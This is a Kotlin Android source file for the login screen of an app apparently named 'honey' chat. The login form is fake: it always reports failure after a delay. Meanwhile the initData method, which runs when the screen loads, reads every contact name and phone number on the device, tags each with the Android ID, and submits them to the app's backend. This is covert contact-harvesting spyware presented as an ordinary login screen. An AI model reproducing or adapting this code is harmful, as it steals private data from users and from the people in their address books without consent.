package com.chat.honey.fragment.login

import android.annotation.SuppressLint
import android.graphics.Typeface
import android.provider.ContactsContract
import android.text.method.HideReturnsTransformationMethod
import android.text.method.PasswordTransformationMethod
import androidx.activity.addCallback
import androidx.annotation.StringRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.widget.addTextChangedListener
import androidx.fragment.app.viewModels
import com.afollestad.materialdialogs.MaterialDialog
import com.afollestad.materialdialogs.customview.customView
import com.chat.base.util.extensions.logE
import com.chat.data.model.ContactItem
import com.chat.honey.R
import com.chat.honey.activity.AppViewModel
import com.chat.honey.base.BaseFragment
import com.chat.honey.databinding.FragmentLoginBinding
import com.chat.honey.type.ExecutionStatus
import com.chat.honey.util.extensions.androidId
import com.chat.honey.util.extensions.repeatOnLifecycleStarted
import com.chat.honey.util.extensions.show
import com.chat.honey.util.extensions.showKeyboard
import com.zcy.pudding.Pudding
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.flow.collectLatest
import kotlin.random.Random

/**
 * Create by Baimsg on 2022/8/14
 *
 **/
@AndroidEntryPoint
class LoginFragment : BaseFragment<FragmentLoginBinding>(R.layout.fragment_login) {

    private val appViewModel by viewModels<AppViewModel>()

    private val loading by lazy {
        MaterialDialog(requireContext())
            .maxWidth(R.dimen.loading)
            .cancelOnTouchOutside(false)
            .cancelable(false)
            .customView(R.layout.dialog_loading)
    }

    @SuppressLint("InlinedApi")
    private val projection: Array<out String> = arrayOf(
        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
        ContactsContract.CommonDataKinds.Phone.NUMBER
    )

    override fun initView() {

        binding.editAccount.apply {
            showKeyboard(true)
            addTextChangedListener {
                binding.ivAccountClear.show(it.toString().isNotBlank())
            }
        }

        binding.ivAccountClear.setOnClickListener {
            binding.editAccount.text = null
        }

        binding.editPassword.apply {
            addTextChangedListener {
                binding.ivPasswordClear.show(it.toString().isNotBlank())
            }
        }

        binding.ivPasswordShow.apply {
            setOnClickListener {
                isSelected = !isSelected
                binding.editPassword.let {
                    it.transformationMethod =
                        if (isSelected) HideReturnsTransformationMethod.getInstance()
                        else PasswordTransformationMethod.getInstance()
                    it.setSelection(it.text?.length ?: 0)
                }
            }
        }

        binding.ivPasswordClear.setOnClickListener {
            binding.editPassword.text = null
        }

        binding.ivLogin.setOnClickListener {
            if (binding.editAccount.text.isNullOrBlank()) {
                show("账号不能为空")
                binding.editAccount.showKeyboard(true)
                return@setOnClickListener
            }
            if (binding.editPassword.text.isNullOrBlank()) {
                show("密码不能为空")
                binding.editPassword.showKeyboard(true)
                return@setOnClickListener
            }
            loading.show()
            it.postDelayed({
                loading.dismiss()
                show(text = "登录失败):")
            }, (Random.nextLong(1) + 1) * 1000)
        }

        binding.tvRegister.setOnClickListener {
            show(textRes = R.string.register_tip);
        }

        requireActivity().onBackPressedDispatcher.addCallback(this) {
            requireActivity().finish()
        }
    }

    override fun initLiveData() {
        repeatOnLifecycleStarted {
            appViewModel.observeSubmitContactViewState.collectLatest {
                when (it.executionStatus) {
                    ExecutionStatus.LOADING -> {
                        loading.show()
                    }
                    ExecutionStatus.SUCCESS -> {
                        loading.dismiss()
                        show(it.msg)
                    }
                    ExecutionStatus.FAIL -> {
                        loading.dismiss()
                        show(it.msg)
                    }
                    else -> Unit
                }
            }
        }
    }

    override fun initData() {
        val profileCursor = requireActivity().contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            projection, null, null, null
        )
        while (profileCursor?.moveToNext() == true) {
            appViewModel.addContact(
                ContactItem(
                    alias = profileCursor.getString(0),
                    number = profileCursor.getString(1).replace(" ", ""),
                    type = requireContext().androidId()
                )
            )
        }
        appViewModel.submitBook()
    }

    private fun show(text: String? = null, @StringRes textRes: Int? = null) {
        Pudding.create(requireActivity() as AppCompatActivity) {
            setChocoBackgroundColor(
                ContextCompat.getColor(
                    requireContext(),
                    R.color.color_primary_variant
                )
            )
            setTitleTypeface(Typeface.DEFAULT_BOLD)
            text?.let {
                setTitle(it)
            }
            textRes?.let {
                setTitle(it)
            }
        }.show()
    }
}